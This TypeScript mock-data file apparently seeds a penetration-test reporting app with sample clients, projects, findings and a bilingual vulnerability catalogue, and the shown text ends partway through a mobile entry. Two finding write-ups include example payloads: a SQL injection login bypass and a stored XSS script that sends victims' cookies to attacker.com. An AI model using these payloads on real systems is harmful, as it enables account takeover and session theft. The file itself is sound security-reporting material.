

import type { Client, Project, Finding, Vulnerability, ProjectTemplate } from './types';
import { format } from 'date-fns';

export const clients: Client[] = [
  { id: 'cli-htb', name: 'Hack The Box', contact: 'contact@hackthebox.eu', phone: '+1-202-555-0182', logoUrl: '' },
  { id: 'cli-ine', name: 'INE Security', contact: 'security@ine.com', phone: '+1-202-555-0182', logoUrl: '' },
  { id: 'cli-offsec', name: 'Offsec', contact: 'audit@offsec.com', phone: '+1-202-555-0182', logoUrl: '' },
  { id: 'cli-h4ck', name: 'h4ckercademy', contact: 'info@h4ckercademy.com', phone: '+1-202-555-0182', logoUrl: '' },
];

export const projects: Project[] = [
  {
    id: 'proj-1',
    clientId: 'cli-htb',
    name: 'Q3 Web App Pentest',
    reportBody: `# Executive Summary
This report outlines the results of an external penetration test performed on the internet-facing assets of **[TODO: Client Name]**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter. The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).

## Attack Narrative
[TODO: Provide a high-level summary of the attack path and key findings.]

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|:---|---|:---|
| <span style="color:red">Critical</span> | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| <span style="color:orange">High</span> | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| <span style="color:yellow">Medium</span> | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| <span style="color:blue">Low</span> | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| <span style="color:gray">Informational</span> | 0.0 | Observations about the external footprint of the organization. |
`,
    startDate: '2023-07-01',
    endDate: '2023-07-15',
    status: 'Completed',
    language: 'en',
    createdAt: '2023-07-01T10:00:00Z',
    updatedAt: '2023-07-15T18:00:00Z',
    icon: 'Scan'
  },
  {
    id: 'proj-2',
    clientId: 'cli-ine',
    name: 'Análisis de Red Interna',
    reportBody: ``,
    startDate: '2023-08-10',
    endDate: '2023-08-20',
    status: 'In Progress',
    language: 'es',
    createdAt: '2023-08-10T09:00:00Z',
    updatedAt: '2023-08-15T14:30:00Z',
    icon: 'Network'
  },
];

export const findings: Finding[] = [
  {
    id: 'find-1',
    projectId: 'proj-1',
    vulnerabilityId: 'vuln-web-001',
    title: 'SQL Injection on Login Form',
    severity: 'Critical',
    cvss: 9.8,
    markdown: `### Technical Description
The 'username' parameter of the login POST request to /auth/login is vulnerable. By submitting a crafted payload like \`' OR '1'='1' --\`, an attacker can manipulate the backend SQL query to always return true, effectively logging in as the first user in the database (often an administrator).

---
### Affected Components
- \`/auth/login\` endpoint
- User authentication module

---
### Impact
Successful exploitation grants an attacker unauthorized access to the application. Depending on the user account compromised (e.g., an administrator), this could lead to a full application compromise, data exfiltration, and further attacks against the underlying infrastructure.

---
### Recommendations
[TODO: Add detailed recommendations]
`,
    createdAt: '2023-07-05T11:00:00Z',
    updatedAt: '2023-07-10T15:00:00Z'
  },
  {
    id: 'find-2',
    projectId: 'proj-1',
    vulnerabilityId: 'vuln-web-002',
    title: 'Stored Cross-Site Scripting (XSS) in User Profile',
    severity: 'High',
    cvss: 8.0,
    markdown: `### Technical Description
The 'bio' field in the user profile page does not properly sanitize user input before storing it in the database and rendering it on the page. An attacker can set their biography to a malicious script, such as \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\`. When another user views the attacker's profile, the script will execute in their browser.

---
### Affected Components
- User profile page (e.g., /profile/{userId})
- 'bio' field update functionality

---
### Impact
This vulnerability can be used to steal session cookies, perform actions on behalf of other users (CSRF), redirect users to malicious websites, or deface the application. If an administrator's session is hijacked, it could lead to a full application compromise.

---
### Recommendations
[TODO: Add detailed recommendations]
`,
    createdAt: '2023-07-06T14:00:00Z',
    updatedAt: '2023-07-11T10:00:00Z'
  },
];

const emptyVulnBoilerplate = {
  remediation_en: {
    shortTerm: "[TODO: Describe the immediate fix, e.g., applying a patch or a hotfix.]",
    mediumTerm: "[TODO: Describe the medium-term solution, e.g., refactoring the vulnerable code.]",
    longTerm: "[TODO: Describe the long-term strategy, e.g., implementing a new security control or providing developer training.]"
  },
  remediation_es: {
    shortTerm: "[TODO: Describir la solución inmediata, p. ej., aplicar un parche o un hotfix.]",
    mediumTerm: "[TODO: Describir la solución a medio plazo, p. ej., refactorizar el código vulnerable.]",
    longTerm: "[TODO: Describir la estrategia a largo plazo, p. ej., implementar un nuevo control de seguridad o proporcionar formación a los desarrolladores.]"
  },
};

export const vulnerabilities: Vulnerability[] = [
    // --- WEB VULNERABILITIES ---
    {
        id: "vuln-web-001",
        title_en: "SQL Injection",
        title_es: "Inyección SQL",
        overview_en: "### Overview\nSQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.",
        overview_es: "### Resumen\nLa inyección SQL es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación hace a su base de datos. Generalmente, permite a un atacante ver datos que normalmente no podría recuperar.",
        cwe: "CWE-89",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/www-community/attacks/SQL_Injection"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-002",
        title_en: "Cross-Site Scripting (XSS)",
        title_es: "Secuencias de Comandos en Sitios Cruzados (XSS)",
        overview_en: "### Overview\nCross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.",
        overview_es: "### Resumen\nLos ataques de Cross-Site Scripting (XSS) son un tipo de inyección, en la que se inyectan scripts maliciosos en sitios web que de otro modo serían benignos y confiables. Los ataques XSS ocurren cuando un atacante utiliza una aplicación web para enviar código malicioso, generalmente en forma de un script del lado del navegador, a un usuario final diferente.",
        cwe: "CWE-79",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/www-community/attacks/xss/"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-003",
        title_en: "Cross-Site Request Forgery (CSRF)",
        title_es: "Falsificación de Peticiones en Sitios Cruzados (CSRF)",
        overview_en: "### Overview\nCross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.",
        overview_es: "### Resumen\nLa Falsificación de Peticiones en Sitios Cruzados (CSRF) es un ataque que obliga a un usuario final a ejecutar acciones no deseadas en una aplicación web en la que está autenticado. Los ataques CSRF se dirigen específicamente a peticiones que cambian el estado, no al robo de datos, ya que el atacante no tiene forma de ver la respuesta a la petición falsificada.",
        cwe: "CWE-352",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "N", integrity: "H", availability: "N" },
        references: ["https://owasp.org/www-community/attacks/csrf"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-004",
        title_en: "OS Command Injection",
        title_es: "Inyección de Comandos del Sistema Operativo",
        overview_en: "### Overview\nOS command injection is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.",
        overview_es: "### Resumen\nLa inyección de comandos del sistema operativo es una vulnerabilidad de seguridad web que permite a un atacante ejecutar comandos arbitrarios del sistema operativo (SO) en el servidor que ejecuta una aplicación y, por lo general, comprometer por completo la aplicación y todos sus datos.",
        cwe: "CWE-78",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/www-community/attacks/Command_Injection"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-005",
        title_en: "File Inclusion (LFI/RFI)",
        title_es: "Inclusión de Archivos (LFI/RFI)",
        overview_en: "### Overview\nFile Inclusion vulnerabilities allow an attacker to include a file, usually exploiting a 'dynamic file inclusion' mechanism implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.",
        overview_es: "### Resumen\nLas vulnerabilidades de inclusión de archivos permiten a un atacante incluir un archivo, generalmente explotando un mecanismo de 'inclusión dinámica de archivos' implementado en la aplicación de destino. La vulnerabilidad ocurre debido al uso de entradas proporcionadas por el usuario sin una validación adecuada.",
        cwe: "CWE-98",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Local_File_Inclusion"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-006",
        title_en: "Insecure Deserialization",
        title_es: "Deserialización Insegura",
        overview_en: "### Overview\nInsecure deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application, inflict a denial-of-service (DoS) attack, or even execute arbitrary code upon it being deserialized.",
        overview_es: "### Resumen\nLa deserialización insegura es una vulnerabilidad que ocurre cuando se utilizan datos no confiables para abusar de la lógica de una aplicación, infligir un ataque de denegación de servicio (DoS) o incluso ejecutar código arbitrario al ser deserializado.",
        cwe: "CWE-502",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization"],
        tags: ["Web", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-007",
        title_en: "Broken Access Control",
        title_es: "Control de Acceso Roto",
        overview_en: "### Overview\nAccess control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits.",
        overview_es: "### Resumen\nEl control de acceso impone políticas para que los usuarios no puedan actuar fuera de sus permisos previstos. Las fallas generalmente conducen a la divulgación, modificación o destrucción no autorizada de todos los datos o a la realización de una función comercial fuera de los límites del usuario.",
        cwe: "CWE-284",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/Top10/es/A01_2021-Broken_Access_Control/"],
        tags: ["Web", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-008",
        title_en: "Sensitive Data Exposure",
        title_es: "Exposición de Datos Sensibles",
        overview_en: "### Overview\nSensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions. Examples of sensitive data include passwords, credit card numbers, health records, personal information, and business secrets.",
        overview_es: "### Resumen\nLos datos sensibles pueden verse comprometidos sin una protección adicional, como el cifrado en reposo o en tránsito, y requieren precauciones especiales. Ejemplos de datos sensibles incluyen contraseñas, números de tarjetas de crédito, registros de salud, información personal y secretos comerciales.",
        cwe: "CWE-312",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-009",
        title_en: "Security Misconfiguration",
        title_es: "Configuración de Seguridad Incorrecta",
        overview_en: "### Overview\nSecurity misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information.",
        overview_es: "### Resumen\nLa configuración de seguridad incorrecta es el problema más común. Suele ser el resultado de configuraciones predeterminadas inseguras, configuraciones incompletas o ad hoc, almacenamiento en la nube abierto, encabezados HTTP mal configurados y mensajes de error detallados que contienen información sensible.",
        cwe: "CWE-2",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        references: ["https://owasp.org/Top10/es/A05_2021-Security_Misconfiguration/"],
        tags: ["Web", "Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-010",
        title_en: "Open Redirect",
        title_es: "Redirección Abierta",
        overview_en: "### Overview\nAn open redirect is an application that takes a parameter and redirects a user to that parameter value without any validation. This vulnerability is used in phishing attacks to get users to trust the domain they are redirected to.",
        overview_es: "### Resumen\nUna redirección abierta es una aplicación que toma un parámetro y redirige a un usuario a ese valor de parámetro sin ninguna validación. Esta vulnerabilidad se utiliza en ataques de phishing para que los usuarios confíen en el dominio al que son redirigidos.",
        cwe: "CWE-601",
        severity: "Medium",
        cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        references: ["https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-011",
        title_en: "Path Traversal",
        title_es: "Salto de Directorio",
        overview_en: "### Overview\nA path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations, it may be possible to access arbitrary files and directories.",
        overview_es: "### Resumen\nUn ataque de salto de directorio (también conocido como directory traversal) tiene como objetivo acceder a archivos y directorios que se almacenan fuera de la carpeta raíz web. Al manipular variables que hacen referencia a archivos con secuencias de “punto-punto-barra (../)” y sus variaciones, puede ser posible acceder a archivos y directorios arbitrarios.",
        cwe: "CWE-22",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-community/attacks/Path_Traversal"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-012",
        title_en: "XML External Entity (XXE) Injection",
        title_es: "Inyección de Entidades Externas XML (XXE)",
        overview_en: "### Overview\nAn XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.",
        overview_es: "### Resumen\nUn ataque de Entidad Externa XML es un tipo de ataque contra una aplicación que analiza entradas XML. Este ataque ocurre cuando una entrada XML que contiene una referencia a una entidad externa es procesada por un analizador XML débilmente configurado.",
        cwe: "CWE-611",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-013",
        title_en: "Broken Authentication",
        title_es: "Autenticación Rota",
        overview_en: "### Overview\nApplication functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users' identities temporarily or permanently.",
        overview_es: "### Resumen\nLas funciones de la aplicación relacionadas con la autenticación y la gestión de sesiones a menudo se implementan incorrectamente, lo que permite a los atacantes comprometer contraseñas, claves o tokens de sesión, o explotar otras fallas de implementación para asumir las identidades de otros usuarios de forma temporal o permanente.",
        cwe: "CWE-287",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"],
        tags: ["Web", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-014",
        title_en: "Insufficient Input Validation",
        title_es: "Validación de Entrada Insuficiente",
        overview_en: "### Overview\nInsufficient input validation occurs when an application fails to properly validate data from the user or client. This can lead to a wide range of vulnerabilities, as the unvalidated data can be used to exploit other parts of the application.",
        overview_es: "### Resumen\nLa validación de entrada insuficiente ocurre cuando una aplicación no valida correctamente los datos del usuario o cliente. Esto puede conducir a una amplia gama de vulnerabilidades, ya que los datos no validados pueden usarse para explotar otras partes de la aplicación.",
        cwe: "CWE-20",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        references: ["https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-all-inputs"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-015",
        title_en: "Insufficient Output Encoding",
        title_es: "Codificación de Salida Insuficiente",
        overview_en: "### Overview\nInsufficient output encoding can lead to injection vulnerabilities, most notably Cross-Site Scripting (XSS). This occurs when user-controllable data is rendered on a page without being properly encoded for the specific context (HTML, JavaScript, CSS, etc.).",
        overview_es: "### Resumen\nLa codificación de salida insuficiente puede conducir a vulnerabilidades de inyección, especialmente Cross-Site Scripting (XSS). Esto ocurre cuando los datos controlables por el usuario se representan en una página sin ser codificados adecuadamente para el contexto específico (HTML, JavaScript, CSS, etc.).",
        cwe: "CWE-116",
        severity: "High",
        cvss: { score: 7.2, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Output_Encoding_Cheat_Sheet.html"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-016",
        title_en: "Excessive Data Exposure",
        title_es: "Exposición Excesiva de Datos",
        overview_en: "### Overview\nAPIs may inadvertently expose more data than is necessary for the client function. Attackers can analyze API responses to find sensitive information that is not displayed in the UI, but is present in the data returned.",
        overview_es: "### Resumen\nLas APIs pueden exponer inadvertidamente más datos de los necesarios para la función del cliente. Los atacantes pueden analizar las respuestas de la API para encontrar información sensible que no se muestra en la interfaz de usuario, pero que está presente en los datos devueltos.",
        cwe: "CWE-200",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-api-security/"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-017",
        title_en: "Insecure Direct Object References (IDOR)",
        title_es: "Referencias Inseguras a Objetos Directos (IDOR)",
        overview_en: "### Overview\nIDOR vulnerabilities occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability, attackers can bypass authorization and access resources in the system directly, for example database records or files.",
        overview_es: "### Resumen\nLas vulnerabilidades de IDOR ocurren cuando una aplicación proporciona acceso directo a objetos basándose en la entrada proporcionada por el usuario. Como resultado de esta vulnerabilidad, los atacantes pueden eludir la autorización y acceder directamente a los recursos del sistema, por ejemplo, a registros de la base de datos o archivos.",
        cwe: "CWE-639",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/Top10/es/A01_2021-Broken_Access_Control/"],
        tags: ["Web", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-018",
        title_en: "Clickjacking",
        title_es: "Clickjacking",
        overview_en: "### Overview\nClickjacking, also known as a 'UI redress attack', is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the top-level page.",
        overview_es: "### Resumen\nEl clickjacking, también conocido como 'ataque de reparación de la interfaz de usuario', ocurre cuando un atacante utiliza múltiples capas transparentes u opacas para engañar a un usuario para que haga clic en un botón o enlace en otra página cuando tenía la intención de hacer clic en la página de nivel superior.",
        cwe: "CWE-1021",
        severity: "Low",
        cvss: { score: 3.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "N", integrity: "L", availability: "N" },
        references: ["https://owasp.org/www-community/attacks/Clickjacking"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-019",
        title_en: "Cache Poisoning",
        title_es: "Envenenamiento de Caché",
        overview_en: "### Overview\nWeb cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.",
        overview_es: "### Resumen\nEl envenenamiento de caché web es una técnica avanzada mediante la cual un atacante explota el comportamiento de un servidor web y una caché para que se sirva una respuesta HTTP dañina a otros usuarios.",
        cwe: "CWE-444",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "N" },
        references: ["https://portswigger.net/web-security/web-cache-poisoning"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-020",
        title_en: "HTTP Parameter Pollution",
        title_es: "Contaminación de Parámetros HTTP",
        overview_en: "### Overview\nHTTP Parameter Pollution (HPP) is a web attack in which an attacker manipulates how a web application handles HTTP parameters. By injecting multiple parameters with the same name, an attacker can cause the application to interpret them in unintended ways, potentially bypassing security controls.",
        overview_es: "### Resumen\nLa Contaminación de Parámetros HTTP (HPP) es un ataque web en el que un atacante manipula cómo una aplicación web maneja los parámetros HTTP. Al inyectar múltiples parámetros con el mismo nombre, un atacante puede hacer que la aplicación los interprete de formas no deseadas, eludiendo potencialmente los controles de seguridad.",
        cwe: "CWE-235",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"],
        tags: ["Web"],
        ...emptyVulnBoilerplate
    },
    // --- MOBILE VULNERABILITIES ---
    {
        id: "vuln-mob-001",
        title_en: "Improper Credential Usage",
        title_es: "Uso Inadecuado de Credenciales",
        overview_en: "### Overview\nThis vulnerability covers various flaws related to the handling of user credentials, such as storing them insecurely, transmitting them without encryption, or exposing them in logs.",
        overview_es: "### Resumen\nEsta vulnerabilidad cubre diversas fallas relacionadas con el manejo de credenciales de usuario, como almacenarlas de forma insegura, transmitirlas sin cifrado o exponerlas en registros.",
        cwe: "CWE-522",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M2-Improper_Credential_Usage"],
        tags: ["Mobile", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-002",
        title_en: "Inadequate Supply Chain Security",
        title_es: "Seguridad Inadecuada de la Cadena de Suministro",
        overview_en: "### Overview\Vulnerabilities introduced by third-party libraries, SDKs, or other components integrated into the mobile application. These components may contain known or unknown vulnerabilities.",
        overview_es: "### Resumen\nVulnerabilidades introducidas por bibliotecas de terceros, SDK u otros componentes integrados en la aplicación móvil. Estos componentes pueden contener vulnerabilidades conocidas o desconocidas.",
        cwe: "CWE-1396",
        severity: "High",
        cvss: { score: 8.0, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M3-Inadequate_Supply_Chain_Security"],
        tags: ["Mobile"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-003",
        title_en: "Insecure Authentication / Authorization",
        title_es: "Autenticación / Autorización Insegura",
        overview_en: "### Overview\nWeaknesses in the mechanisms that authenticate users and enforce their permissions. This can include flaws in session management, password policies, or access control checks.",
        overview_es: "### Resumen\nDebilidades en los mecanismos que autentican a los usuarios y hacen cumplir sus permisos. Esto puede incluir fallas en la gestión de sesiones, políticas de contraseñas o verificaciones de control de acceso.",
        cwe: "CWE-287",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M4-Insecure_Authentication_Authorization"],
        tags: ["Mobile", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-004",
        title_en: "Insufficient Input/Output Validation",
        title_es: "Validación de Entrada/Salida Insuficiente",
        overview_en: "### Overview\nThis category covers vulnerabilities that arise from not properly validating data received from the user or other components, and not properly encoding data sent to other components, leading to issues like XSS, SQLi, etc., within the mobile context.",
        overview_es: "### Resumen\nEsta categoría cubre vulnerabilidades que surgen de no validar adecuadamente los datos recibidos del usuario u otros componentes, y de no codificar adecuadamente los datos enviados a otros componentes, lo que conduce a problemas como XSS, SQLi, etc., en el contexto móvil.",
        cwe: "CWE-20",
        severity: "High",
        cvss: { score: 8.0, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M5-Insufficient_Input_Output_Validation"],
        tags: ["Mobile"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-005",
        title_en: "Insecure Communication",
        title_es: "Comunicación Insegura",
        overview_en: "### Overview\nThis vulnerability involves the transmission of sensitive data over unencrypted or weakly encrypted channels. An attacker with access to the network can intercept, read, and modify the data.",
        overview_es: "### Resumen\nEsta vulnerabilidad implica la transmisión de datos sensibles a través de canales no cifrados o débilmente cifrados. Un atacante con acceso a la red puede interceptar, leer y modificar los datos.",
        cwe: "CWE-319",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M6-Insecure_Communication"],
        tags: ["Mobile", "Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-006",
        title_en: "Inadequate Privacy Controls",
        title_es: "Controles de Privacidad Inadecuados",
        overview_en: "### Overview\nThis category includes issues where the application unnecessarily collects, stores, or transmits Personally Identifiable Information (PII) or other sensitive user data without proper consent or security controls.",
        overview_es: "### Resumen\nEsta categoría incluye problemas en los que la aplicación recopila, almacena o transmite innecesariamente Información de Identificación Personal (PII) u otros datos sensibles del usuario sin el consentimiento o los controles de seguridad adecuados.",
        cwe: "CWE-359",
        severity: "Medium",
